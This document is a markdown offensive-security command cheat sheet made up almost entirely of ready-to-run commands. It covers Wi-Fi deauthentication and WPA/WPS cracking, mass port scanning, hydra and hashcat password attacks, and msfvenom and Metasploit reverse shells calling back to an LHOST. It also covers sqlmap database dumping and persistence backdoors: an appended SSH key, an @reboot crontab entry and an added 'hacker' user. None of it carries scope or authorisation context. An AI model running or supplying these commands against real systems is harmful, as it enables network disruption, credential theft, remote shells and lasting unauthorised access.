# Command Reference

## Wireless Commands

### Monitor Mode
```bash
# Check interfaces
airmon-ng

# Start monitor mode
airmon-ng start wlan0

# Stop monitor mode  
airmon-ng stop wlan0mon

# Manual method
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Check status
iw dev
ip link show
```

### Scanning Networks
```bash
# Scan all channels
airodump-ng wlan0mon

# Scan specific channel
airodump-ng --channel 6 wlan0mon

# Scan and save to file
airodump-ng --write capture --output-format pcap wlan0mon

# Target specific network
airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

### Deauthentication Attacks
```bash
# Broadcast deauth
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Targeted deauth
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Continuous deauth
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Injection Testing
```bash
# Test injection
aireplay-ng -9 wlan0mon

# Test on specific AP
aireplay-ng -9 -e "SSID" -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Fake Authentication
```bash
# Fake auth
aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Reauth with delay
aireplay-ng --fakeauth 6000 -o 1 -q 10 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

### ARP Injection
```bash
aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

### Fragmentation Attack
```bash
aireplay-ng --fragment -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

### Cracking
```bash
# Crack WPA
aircrack-ng -w wordlist.txt capture-01.cap

# Crack with hashcat (PMKID)
hashcat -m 22000 pmkid.hccapx wordlist.txt

# Crack with hashcat (cap to hccapx)
hashcat -m 2500 capture.hccapx wordlist.txt
```

### WPS Attacks
```bash
# Scan WPS networks
wash -i wlan0mon

# Reaver brute force
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1

# Bully alternative
bully -b AA:BB:CC:DD:EE:FF wlan0mon

# Pixiewps (offline WPS attack)
pixiewps -e PKE -r PKR -s SHA1 -z MAC -f
```

### MAC Address Spoofing
```bash
# Random MAC
macchanger -r wlan0

# Specific MAC
macchanger -m XX:XX:XX:XX:XX:XX wlan0

# Show current MAC
macchanger -s wlan0
```

---

## Network Scanning Commands

### Nmap
```bash
# Basic scan
nmap target.com

# Full port scan
nmap -p- target.com

# Service version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Aggressive scan
nmap -A target.com

# UDP scan
nmap -sU target.com

# Script scan
nmap --script vuln target.com

# Output formats
nmap -oA scanme target.com
nmap -oN scanme.nmap target.com
nmap -oX scanme.xml target.com
```

### Masscan
```bash
# Fast scan
masscan -p1-65535 --rate 1000 192.168.1.0/24

# Specific ports
masscan -p80,443,8080 --rate 1000 0.0.0.0/0
```

### Rustscan
```bash
rustscan -a target.com --ulimit 5000
```

---

## Password Attacks

### Hashcat
```bash
# List modes
hashcat --help | grep " hashes"

# Common modes
# 0 = MD5
# 100 = SHA1  
# 1400 = SHA256
# 1700 = SHA512
# 2500 = WPA/WPA2
# 22000 = WPA-PMKID-PBKDF2

# Crack
hashcat -m 1400 hash.txt wordlist.txt

# Resume
hashcat --session session --restore

# Rules
hashcat -m 1400 hash.txt wordlist.txt -r rules/best64.rule
```

### John the Ripper
```bash
# Wordlist mode
john --wordlist=wordlist.txt hash.txt

# Single mode
john --single hash.txt

# Format detection
john --format=raw-md5 hash.txt

# Show results
john --show hash.txt
```

### Hydra
```bash
# SSH brute force
hydra -L users.txt -P passwords.txt ssh://target.com

# HTTP POST
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -L users.txt -P passwords.txt ftp://target.com
```

---

## Exploitation

### Metasploit
```bash
# Start
msfconsole

# Search
searchsploit apache

# Use exploit
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run

# Database
msfdb init
workspace -a myproject
db_nmap target.com
```

### MSFVenom
```bash
# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f elf > shell.elf

# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f exe > shell.exe

# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=443 -f raw
```

---

## Web Application

### Directory Scanning
```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# FFuf
ffuf -w wordlist.txt -u http://target.com/FUZZ

# Dirsearch
dirsearch -u http://target.com
```

### SQL Injection
```bash
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" --dump
```

### Nikto
```bash
nikto -h target.com
nikto -h target.com -p 80,443
```

---

## Post-Exploitation

### Shell Upgrade
```bash
# Basic shell
/bin/sh -i

# Python pty
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Stty
stty raw -echo; fg
```

### Privilege Escalation
```bash
# Check sudo
sudo -l

# SUID files
find / -perm -4000 2>/dev/null

# Kernel exploits
uname -a
searchsploit linux kernel $(uname -r)
```

### Persistence
```bash
# SSH key
mkdir ~/.ssh
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Cron job
echo "@reboot /path/to/script" >> /etc/crontab

# User add
useradd -m -s /bin/bash hacker
echo "hacker:PASSWORD" | chpasswd
```
